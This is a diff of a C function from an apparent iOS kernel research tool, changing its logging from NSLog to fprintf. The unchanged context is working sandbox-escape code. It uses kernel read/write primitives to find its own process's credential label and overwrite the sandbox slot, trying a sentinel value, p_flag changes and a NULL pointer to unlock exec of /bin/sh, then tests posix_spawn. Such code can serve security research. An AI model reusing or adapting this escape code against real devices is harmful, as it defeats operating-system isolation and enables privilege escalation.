@@ -463,7 +463,7 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append(" v3 removes ALL scanning — only touches our own proc.)\n\n");
 
     // ── Step 1: Get proc_self() and validate it ──
-    NSLog(@"[SWAP] Step 1: proc_self()");
+    fprintf(stderr, "[SWAP] Step 1: proc_self()\n");
     uint64_t self_proc = proc_self();
     if (!self_proc || !is_kaddr_valid(self_proc)) {
         buf_append("ERROR: proc_self() returned invalid: 0x%llx\n", self_proc);
@@ -472,14 +472,14 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append("proc_self() = 0x%llx OK\n", self_proc);
 
     // ── Step 2: Read proc fields safely ──
-    NSLog(@"[SWAP] Step 2: read p_pid, p_name");
+    fprintf(stderr, "[SWAP] Step 2: read p_pid, p_name\n");
     pid_t our_pid = (pid_t)kread32(self_proc + off_proc_p_pid);
     char p_name[32] = {0};
     kreadbuf(self_proc + off_proc_p_name, p_name, 31);
     buf_append("PID=%d name=%s\n", our_pid, p_name);
 
     // ── Step 3: proc_ro ──
-    NSLog(@"[SWAP] Step 3: proc_ro");
+    fprintf(stderr, "[SWAP] Step 3: proc_ro\n");
     uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
     if (!proc_ro || !is_kaddr_valid(proc_ro)) {
         buf_append("ERROR: proc_ro invalid: 0x%llx\n", proc_ro);
@@ -488,7 +488,7 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append("proc_ro = 0x%llx OK\n", proc_ro);
 
     // ── Step 4: ucred ──
-    NSLog(@"[SWAP] Step 4: ucred");
+    fprintf(stderr, "[SWAP] Step 4: ucred\n");
     uint64_t ucred = kread_ptr(proc_ro + off_proc_ro_p_ucred);
     if (!ucred || !is_kaddr_valid(ucred)) {
         buf_append("ERROR: ucred invalid: 0x%llx\n", ucred);
@@ -497,7 +497,7 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append("ucred = 0x%llx OK\n", ucred);
 
     // ── Step 5: cr_label ──
-    NSLog(@"[SWAP] Step 5: cr_label");
+    fprintf(stderr, "[SWAP] Step 5: cr_label\n");
     uint64_t label = kread_ptr(ucred + off_ucred_cr_label);
     if (!label || !is_kaddr_valid(label)) {
         buf_append("ERROR: cr_label invalid: 0x%llx\n", label);
@@ -506,7 +506,7 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append("cr_label = 0x%llx OK\n", label);
 
     // ── Step 6: sandbox (from label perpolicy) ──
-    NSLog(@"[SWAP] Step 6: sandbox from label+0x%x", off_label_l_perpolicy_sandbox);
+    fprintf(stderr, "[SWAP] Step 6: sandbox from label+0x%x\n", off_label_l_perpolicy_sandbox);
     uint64_t sandbox_raw = kread64(label + off_label_l_perpolicy_sandbox);
     uint64_t sandbox = kread_ptr(label + off_label_l_perpolicy_sandbox);
     buf_append("sandbox raw=0x%llx stripped=0x%llx\n", sandbox_raw, sandbox);
@@ -521,13 +521,13 @@ char *kresearch_swap_sandbox_profile(void) {
     buf_append("sandbox = 0x%llx OK\n", sandbox);
 
     // ── Step 7: Read sandbox_label fields ──
-    NSLog(@"[SWAP] Step 7: sandbox_label fields");
+    fprintf(stderr, "[SWAP] Step 7: sandbox_label fields\n");
     uint64_t profile = kread_ptr(sandbox + 0x00);
     uint64_t ext_set = kread_ptr(sandbox + 0x10);
     buf_append("profile = 0x%llx  ext_set = 0x%llx\n", profile, ext_set);
 
     // ── Step 8: Baseline sandbox_check ──
-    NSLog(@"[SWAP] Step 8: baseline sandbox_check");
+    fprintf(stderr, "[SWAP] Step 8: baseline sandbox_check\n");
     int exec_before = sandbox_check(our_pid, "process-exec",
                                      SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
     int fork_before = sandbox_check(our_pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
@@ -549,7 +549,7 @@ char *kresearch_swap_sandbox_profile(void) {
     bool label_modified = false;
 
     if (!exec_unlocked) {
-        NSLog(@"[SWAP] Approach A: sentinel write");
+        fprintf(stderr, "[SWAP] Approach A: sentinel write\n");
         buf_append("── Approach A: Label sentinel (0xffffffffffffffff) ──\n");
 
         uint64_t slot = label + off_label_l_perpolicy_sandbox;
@@ -557,7 +557,7 @@ char *kresearch_swap_sandbox_profile(void) {
         buf_append("  slot=0x%llx  current_raw=0x%llx\n", slot, label_orig_val);
 
         // Safety: write same value back, verify readback matches
-        NSLog(@"[SWAP] A: safety write-back test");
+        fprintf(stderr, "[SWAP] A: safety write-back test\n");
         kwrite64(slot, label_orig_val);
         uint64_t rb = kread64(slot);
         if (rb != label_orig_val) {
@@ -566,7 +566,7 @@ char *kresearch_swap_sandbox_profile(void) {
         } else {
             buf_append("  Safety test OK — label slot appears writable\n");
 
-            NSLog(@"[SWAP] A: writing sentinel");
+            fprintf(stderr, "[SWAP] A: writing sentinel\n");
             kwrite64(slot, 0xFFFFFFFFFFFFFFFFULL);
             rb = kread64(slot);
             buf_append("  Wrote 0xFFFF...FFFF, readback=0x%llx\n", rb);
@@ -585,7 +585,7 @@ char *kresearch_swap_sandbox_profile(void) {
                     buf_append("  *** EXEC UNLOCKED via sentinel! ***\n");
                     exec_unlocked = true;
                 } else {
-                    NSLog(@"[SWAP] A: restoring label");
+                    fprintf(stderr, "[SWAP] A: restoring label\n");
                     kwrite64(slot, label_orig_val);
                     label_modified = false;
                     buf_append("  Didn't unlock. Restored.\n");
@@ -604,7 +604,7 @@ char *kresearch_swap_sandbox_profile(void) {
     bool pflags_modified = false;
 
     if (!exec_unlocked) {
-        NSLog(@"[SWAP] Approach B: p_flag");
+        fprintf(stderr, "[SWAP] Approach B: p_flag\n");
         buf_append("\n── Approach B: p_flag modification ──\n");
         buf_append("  Current: 0x%08x\n", orig_pflags);
 
@@ -636,7 +636,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // NO scanning — uses our own label + proc only.
     // ═══════════════════════════════════════════════════════════
     if (!exec_unlocked) {
-        NSLog(@"[SWAP] Approach C: combined sentinel + p_flag");
+        fprintf(stderr, "[SWAP] Approach C: combined sentinel + p_flag\n");
         buf_append("\n── Approach C: Combined sentinel + p_flag ──\n");
 
         uint64_t slot = label + off_label_l_perpolicy_sandbox;
@@ -681,7 +681,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // RISKY but different codepath than sentinel.
     // ═══════════════════════════════════════════════════════════
     if (!exec_unlocked) {
-        NSLog(@"[SWAP] Approach D: NULL sandbox pointer in label");
+        fprintf(stderr, "[SWAP] Approach D: NULL sandbox pointer in label\n");
         buf_append("\n── Approach D: NULL sandbox pointer in label ──\n");
 
         uint64_t slot = label + off_label_l_perpolicy_sandbox;
@@ -715,7 +715,7 @@ char *kresearch_swap_sandbox_profile(void) {
     // TRY POSIX_SPAWN if any approach unlocked exec
     // ═══════════════════════════════════════════════════════════
     if (exec_unlocked) {
-        NSLog(@"[SWAP] Testing posix_spawn");
+        fprintf(stderr, "[SWAP] Testing posix_spawn\n");
         buf_append("\n── Testing posix_spawn ──\n");
 
         pid_t child = 0;
@@ -749,7 +749,7 @@ char *kresearch_swap_sandbox_profile(void) {
     }
 
     // ── Restore all modifications ──
-    NSLog(@"[SWAP] Restoring state");
+    fprintf(stderr, "[SWAP] Restoring state\n");
     if (label_modified) {
         kwrite64(label + off_label_l_perpolicy_sandbox, label_orig_val);
     }
